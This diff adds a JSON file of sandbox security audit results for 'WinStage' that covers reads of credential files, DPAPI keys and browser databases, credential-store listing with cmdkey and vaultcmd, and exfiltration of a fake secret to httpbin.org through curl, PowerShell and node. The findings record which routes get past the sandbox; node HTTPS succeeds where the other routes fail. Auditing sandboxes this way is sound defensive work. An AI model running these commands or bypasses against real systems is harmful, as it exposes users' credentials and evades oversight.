@@ -1,0 +1,110 @@
+[
+  {
+    "id": "SEN-01",
+    "title": "敏感面清单（元数据 only）：逐个判定可读性与元数据",
+    "status": "FAIL",
+    "channel": ["PS", "HOST"],
+    "command": "Test-Path/Get-Item/Get-Acl 于 12 类敏感路径 + HOST(SHIM_DISABLE=1) 复核",
+    "expected": "命中 MASK_CLASSES 的敏感凭据/密钥/浏览器库应被遮蔽或至少不可读；用户应能知道哪些被保护",
+    "observed": "读面 100% 开放、零提示。PS 通道可直接读出：.dsh\\.credentials.yaml(223B, SHA256=FE3899E5…9A7223)、.npmrc(40B, 3FC62C79…E612BC)、PSReadLine\\ConsoleHost_history.txt(8084B, 1D5B98BA…5CDADD)。可枚举：.dsh=13 子项、.dsh\\profiles\\web=15、.config\\browser-harness=12、Edge User Data=67/Default=125、%APPDATA%\\Microsoft\\Protect=2（DPAPI 主密钥 468B）、%LOCALAPPDATA%\\Microsoft\\Credentials=3、Vault=1。不存在：.ssh、.git-credentials、pip\\pip.ini（切勿记为被拒）。ACL 全部为 Administrator=FullControl，ACL 层无任何屏障。所有内容一律以 <REDACTED:len=N> 表示，未读取/未输出/未复制任何真实凭据明文。",
+    "hostTruth": "HOST 通道对同一批文件复核得到逐字节相同的 SHA256（npmrc/credyaml/hist 三取三一致）→ 证明这是真实磁盘上的真实文件被读取，而非 overlay 幻影",
+    "evidence": ["evidence/sen01-metadata.txt", "evidence/sen02-read-channels.txt"],
+    "usability": "要回答“哪些文件被保护”没有任何入口：必须读源码 MASK_CLASSES，再手写正则探测；界面无说明，极易误判为“已被保护”。"
+  },
+  {
+    "id": "SEN-02",
+    "title": "读面通道一致性（PS / read 工具 / shim-disabled 子进程）",
+    "status": "FAIL",
+    "channel": ["PS", "STAGE", "HOST"],
+    "command": ".NET ReadAllBytes+SHA256（PS） vs Get-FileHash（HOST/SHIM_DISABLE=1） vs read 工具",
+    "expected": "三条通道语义一致；敏感文件若被保护，应在至少一条通道上被拒",
+    "observed": "三通道对同一文件给出完全一致结果，且全部可读：.npmrc / .dsh\\.credentials.yaml / PSReadLine 历史在 PS 与 HOST 两通道 SHA256 逐字节相同；read 工具可读 .npmrc（1 行，非秘密内容）。Edge Local State（33226→33425→33409B，运行中变化）可整文件读取，含 os_crypt.encrypted_key（base64 396，<REDACTED>）。唯一例外是 Edge Login Data（126976B）：HOST Get-FileHash 返回空——原因是 msedge.exe 独占锁，而非安全边界；复制副本后 SQLite 头 “SQLite format 3” 可读。副作用（FINDING）：Get-FileHash 在敏感路径上不可靠——同一文件同一进程，Get-FileHash 触发 3 次 STAGING_WRITE_UNVERIFIED 门拒绝、1 次 EBUSY、1 次静默吞输出+60s 超时；改用 .NET ReadAllBytes 后 3/3 成功。",
+    "hostTruth": "HOST 与 PS 哈希一致 → 三通道无保护差异",
+    "evidence": ["evidence/sen02-read-channels.txt", "evidence/sen01-metadata.txt"],
+    "usability": "同一语义的两个 API（Get-FileHash / ReadAllBytes）一个被门拒绝或挂起、一个成功；用户无法预判命令能否运行，只能盲试。"
+  },
+  {
+    "id": "SEN-03",
+    "title": "写入/删除/改名隔离（shim 视图内）与 HOST 真值复核",
+    "status": "OK",
+    "channel": ["PS", "CMD", "STAGE", "HOST"],
+    "command": "Set-Content/Add-Content/cmd echo >> / Rename-Item / Remove-Item 于敏感路径；HOST(SHIM_DISABLE=1) 复核 SHA256 与探针存在性；读 review.json",
+    "expected": "敏感路径写/删/改名不得落地真实磁盘；应有风险分级或告警",
+    "observed": "隔离成立且比第一轮更强：10/10 写入全部被拒（8×UnauthorizedAccessException + 2×DirectoryNotFoundException，0 成功）；Add-Content .npmrc 被拒后 LEN 仍 40；cmd echo >> .npmrc exit=0 但 LEN 仍 40（静默无效）；Rename-Item .npmrc / .credentials.yaml → UnauthorizedAccessException；Remove-Item .npmrc → ArgumentException: Access to the path is denied.；.ssh 目录未被创建。HOST 复核：npmrc LEN=40 SHA=3FC62C79…E612BC、LASTMOD=2026-09-10T19:17:43.1090993Z（与测试前完全一致）、credyaml SHA=FE3899E5…9A7223（未变）、7 个探针路径在真实磁盘全部 False。STAGE 通道：review.json revision=4720、riskCounts={normal:2882,outside:15,sensitive:1,danger:0}、alerts=[]、candidates=2（HKCU\\Software\\Python\\Astral… 与 .dsh-selfcheck-*.txt）→ 本次敏感写尝试 0 候选、0 alert、0 danger 分级。shim.log tail 内 denied/EACCES/EPERM=0、'npmrc' 提及=0、'credentials.yaml' 提及=0。",
+    "hostTruth": "真实磁盘上 .npmrc 与 .credentials.yaml 的 SHA256 与mtime 与测试前完全一致，7 个探针文件均不存在 → 写入零落地（注意：这与第一轮“静默进 staging”不同，本轮是直接拒绝）",
+    "evidence": ["evidence/sen03-write-isolation.txt"],
+    "usability": "拒绝文本是裸 OS 异常（UnauthorizedAccessException / ArgumentException），没有一句 WinStage 语义提示；cmd 重定向追加更是 exit=0 且无输出、文件未变（静默无效），用户会误以为写入成功。本次写入未产生任何候选/告警，用户无法事后确认“谁试图写我的敏感文件”。"
+  },
+  {
+    "id": "SEN-04",
+    "title": "审批策略 ask→never 的用户可感知差异",
+    "status": "FINDING",
+    "channel": ["PS", "STAGE"],
+    "command": "grep .dsh\\profiles\\web\\cordis.patch.yml 权限矩阵；统计全过程提示/确认/警告/拒绝次数",
+    "expected": "策略变化应能解释本轮“零审批弹窗”",
+    "observed": "profile 权限矩阵：read-only/workspace-write 档 = approval:ask；danger-full-access 档 = approval:never。本轮生效档为 danger-full-access，因此 approval 被硬编码为 never（不是独立开关）。全过程提示/确认/警告 = 0 次（含读凭据文件、枚举 cmdkey/vault、外发假秘密）；拒绝仅出现在写真实敏感文件时，且均为裸 OS 异常。对照第一轮 ask：敏感文件**读面**表现完全一致（依旧全开放、零提示）→ **策略变更对敏感文件保护/提示零影响**；唯一差异在写侧（第一轮静默进 staging / 本轮直接拒绝），而这一差异同样没有任何提示或告警。另：外发侧本轮 curl(exit 35/Access denied)与 .NET HTTPS(IWR/WebClient/TLS1.2 全失败) 不可用，但 node fetch HTTPS 仍成功——该差异更像 shim 对 Schannel/进程创建的副作用，而非策略所致。",
+    "hostTruth": "review.json alerts=[] 且无任何敏感操作进入候选 → 审批面（若存在）在本轮从未被触发",
+    "evidence": ["evidence/sen04-policy-never.txt", "evidence/sen03-write-isolation.txt"],
+    "usability": "用户能感知到的“策略差异”只有一条：以前写敏感文件静默成功（进 staging），现在报一个看不懂的 Access denied。既没有“为什么被拒”的解释，也没有“以前那样是暂存的”这种上下文，容易被理解成环境故障而非保护生效。"
+  },
+  {
+    "id": "SEN-05",
+    "title": "外发实验（自造假秘密，三通道）",
+    "status": "FAIL",
+    "channel": ["PS", "CMD", "STAGE"],
+    "command": "curl.exe --data-binary/-d https://httpbin.org/post；Invoke-WebRequest -Method Post；node -e fetch(...) https://httpbin.org/post / https://postman-echo.com/post",
+    "expected": "敏感来源内容外发应被拦截、审批或至少记录告警",
+    "observed": "**外发未被任何管控**，但通道可用性本轮发生明显变化。(1) curl.exe：`--version` 直接 “Program 'curl.exe' failed to run: Access is denied”（文件确实在 C:\\WINDOWS\\system32），POST 得 HTTP:000 / exit=35（SSL connect error）→ curl 通道基本不可用（与第一轮 curl 外发成功不同）。(2) .NET/PS：HTTP 明文 Invoke-WebRequest → **HTTP 200，响应回显含假秘密 FAKE-TOKEN-WINSTAGE-R2-7a3f19c4 = True**（数据确实出网）；HTTPS 的 IWR/WebClient/强制 TLS1.2 **全部失败**（underlying connection closed），而 DNS(34.227.237.26) 与 TCP:443 均正常 → .NET/Schannel HTTPS 在沙箱内不可用。(3) node（v24.21.0）：**HTTPS 外发完全成功**——httpbin.org → HTTPS_OK echo=true；postman-echo.com → PE_OK echo=true（直连 stdout 捕获恒为空，须 cmd /c 重定向到文件才拿到输出）。外发是否进入候选/审批面：**否**——review.json 的 candidates 只有 HKCU\\Software\\Python\\Astral 注册表项与 .dsh-selfcheck-*.txt，无任何网络/外发条目；alerts=[]；全过程 0 提示 0 确认。载荷全部为自造假秘密，未外发任何真实凭据内容。",
+    "hostTruth": "review.json 无外发相关候选、alerts 为空 → 网络外发对 WinStage 完全不可见",
+    "evidence": ["evidence/sen05-exfil.txt"],
+    "usability": "用户没有任何“敏感内容正在出网”的信号；连失败/成功都难以判断——curl 报 Access denied、IWR 报底层连接关闭、node 静默无输出（必须改写命令重定向才能看到结果），三通道三种迷惑表现，会让人误判为“网络被封”，而实际 node HTTPS 一路通畅。"
+  },
+  {
+    "id": "SEN-06",
+    "title": "凭据库枚举（只读、不导出明文）",
+    "status": "FAIL",
+    "channel": ["PS", "CMD"],
+    "command": "cmdkey /list；vaultcmd /list；vaultcmd /listcreds:*；读 %LOCALAPPDATA%\\Microsoft\\Credentials 文件头",
+    "expected": "枚举凭据库应受限或至少留下可感知痕迹",
+    "observed": "**无阻碍枚举成功**。cmdkey /list exit=0、输出 765B，枚举出 ≥5 条真实凭据条目（MicrosoftAccount SSO_POP_User、SSO_POP_Device、Office16 live cid、WindowsLive didlogical 等），条目中的账号标识为真实值，本报告已一律 <REDACTED>。vaultcmd /list exit=0，列出 Web 凭据 vault（GUID 4BF4C442-9B8A-41A0-B380-DD4A704DDB28）及磁盘位置；vaultcmd /listcreds:* 返回 “Invalid vault: Element not found.”（本地化 CLI 不接受 * 通配，未用 GUID 重试以避免枚举真实凭据明细）。Windows Credentials 三个 blob（1298/4674/11698B）在 PS/HOST 通道均 READ_OK（前 4 字节 01000000）；%APPDATA%\\Microsoft\\Credentials 为空（0 项）。Get-Credential 相关按任务要求未测。全过程 0 提示 0 告警。",
+    "hostTruth": "review.json 无任何与凭据枚举相关的候选/告警 → 枚举行为对审批面不可见",
+    "evidence": ["evidence/sen06-credstore.txt"],
+    "usability": "一条 cmdkey /list 就能列出真实账号标识，用户毫无察觉；且 vaultcmd 的 * 通配在本地化版本失效，报错“Element not found”与“权限被拒”无法区分，容易误导。"
+  },
+  {
+    "id": "SEN-07",
+    "title": "DPAPI / 浏览器数据库可读性（只读，不解密不导出）",
+    "status": "FAIL",
+    "channel": ["PS", "HOST"],
+    "command": "读 %APPDATA%\\Microsoft\\Protect 主密钥头 4B；读 Edge Local State JSON 结构；复制 Login Data/Web Data 并读 SQLite 头",
+    "expected": "DPAPI 主密钥与浏览器凭据库应不可读或至少受保护",
+    "observed": "全部可读（未解密、未导出）。(a) DPAPI 用户主密钥目录 %APPDATA%\\Microsoft\\Protect\\S-1-5-21-…-500 含 b5d93429-9b54-4f6f-9980-ea30386885c8(468B) 与 Preferred(24B)，主密钥前 4 字节 MK_MAGIC_OK=02000000（标准版本头）→ 文件可读可识别；CREDHIST(24B) 可 stat。未做任何 CryptUnprotectData 调用。(b) Edge User Data：Login Data 126976B / Login Data For Account 51200B / Web Data 294912B / Network\\Cookies 106496B / History 491520B / Preferences 125133B / Trust Tokens 36864B 全部存在；Login Data 与 Web Data 复制成功，Login Data 头 16B = “SQLite format 3”。(c) Local State 可整文件读取（LEN=33409），os_crypt 与 os_crypt.encrypted_key 均存在，encrypted_key 为 base64 396 字符、前缀 “RFB”（DPAPI 保护标志），值本身 <REDACTED:len=396>。唯一阻碍是 msedge.exe 运行导致的文件独占锁（HOST Get-FileHash 返回空），复制副本后即可读——锁不是安全边界。sqlite3 CLI 不在 PATH → N-A（未读取 encrypted_value、未安装任何工具）。",
+    "hostTruth": "DPAPI 主密钥与浏览器库均为真实磁盘上的真实文件，HOST 通道可读/可复制",
+    "evidence": ["evidence/sen07-dpapi-browser.txt"],
+    "usability": "“文件被锁”会被误读为“被保护”：Get-FileHash 返回空、无任何错误说明，用户无法区分“浏览器占用”与“沙箱拒绝”。"
+  },
+  {
+    "id": "SEN-08",
+    "title": "会话私有目录 private\\ 的内容与权限屏障",
+    "status": "FINDING",
+    "channel": ["PS", "HOST"],
+    "command": "Get-ChildItem -Force -Recurse $DSH_REGSTAGE_ROOT\\private；Get-Acl",
+    "expected": "private\\ 应是权限隔离的真实屏障",
+    "observed": "目录存在但**为空**（顶层与递归均 0 项，无密钥/令牌/私有状态文件）。ACL：Everyone → Deny DeleteSubdirectoriesAndFiles；两个非标准 SID（S-1-4-56185984-606674207、S-1-4-1039366120-933337351）→ Allow Write/Delete/Synchronize；NT AUTHORITY\\SYSTEM、BUILTIN\\Administrators、WIN-DV9KRECLBVS\\Administrator → FullControl。判定：**不是真实屏障**——Everyone 上是 Deny ACE（Windows 中 Deny 不构成“缺少 Allow”式保护），而沙箱内进程身份即 Administrator 且持有 FullControl，该 Deny 规则对沙箱内进程无实际约束力；两个 S-1-4-* SID 表明设计意图是“由受限容器身份写入”，但当前写路径未强制使用该容器（与第一轮源码注释“T0/AppContainer 未接线、残余边界 R1”一致）。",
+    "hostTruth": "private\\ 位于 STAGE/regstage（passthrough 列表内）→ 该 ACL 就是真实磁盘上的 ACL",
+    "evidence": ["evidence/sen08-private-dir.txt"],
+    "usability": "名为 private、带一条 Deny 规则，很容易让用户以为已有私有隔离；实际为空目录且当前用户 FullControl，界面无任何说明。"
+  },
+  {
+    "id": "SEN-09",
+    "title": "易用性：普通用户如何知道敏感文件被读走了",
+    "status": "FAIL",
+    "channel": ["PS", "STAGE"],
+    "command": "综合现场取证：shim.log 敏感路径提及计数、review.json alerts、拒绝文本形态、四次透明度提问",
+    "expected": "用户应能知道：哪些被保护、读敏感文件是否有提示、事后能否查、被拒原因",
+    "observed": "四问全部答不出。(1) 哪些被保护：无界面/无命令，唯一来源是 40+ 条 MASK_CLASSES 源码正则。(2) 读时是否有提示：**没有**——本次读了 .dsh\\.credentials.yaml、.npmrc、PSReadLine 历史、DPAPI 主密钥、3 个凭据 blob、Edge 三个库，全程 0 提示 0 告警；读操作根本不进 review.json 计数。(3) 事后能否查：几乎不能——shim.log 中 'npmrc'/'credentials.yaml' 提及=0、denied/EACCES/EPERM=0，review.json alerts=[]，唯一信号是无差别的 CreateFile overlay(read) 行，无敏感度分级、非用户可读界面。(4) 被拒原因：裸 OS 异常（UnauthorizedAccessException / ArgumentException），无 WinStage 语义；cmd 重定向追加甚至 exit=0 且文件未变（静默无效）。建议 3 条：① 敏感路径读访问审计 + 一次性实时提示（读也要提示，读面才是泄漏点）；② 外发域名白名单 / 危险档来源内容出网需显式确认；③ 提供 `dsh stage ls`/面板徽标（pending/sensitive/danger 计数+路径）与“人话”拒绝原因，并统一同义 API 的可用性。",
+    "hostTruth": "shim.log 与 review.json 是唯一的两个事后真相源，均不区分“读”，也不含敏感路径标签 → 读面无任何可审计痕迹",
+    "evidence": ["evidence/sen09-usability.txt", "evidence/sen04-policy-never.txt"],
+    "usability": "额外坑：WINSTAGE_STAGE_ROOT/WINSTAGE_SHIM_CONFIG 在部分 shim 子进程中为空导致静默失败；STAGING_WRITE_UNVERIFIED 门 3 次误报（同命令重试即通过）；CreateProcessAsUserW Win32 5 拒绝启动 powershell.exe；node stdout 捕获恒为空须 cmd 重定向；vaultcmd * 通配报错含义不明。"
+  }
+]
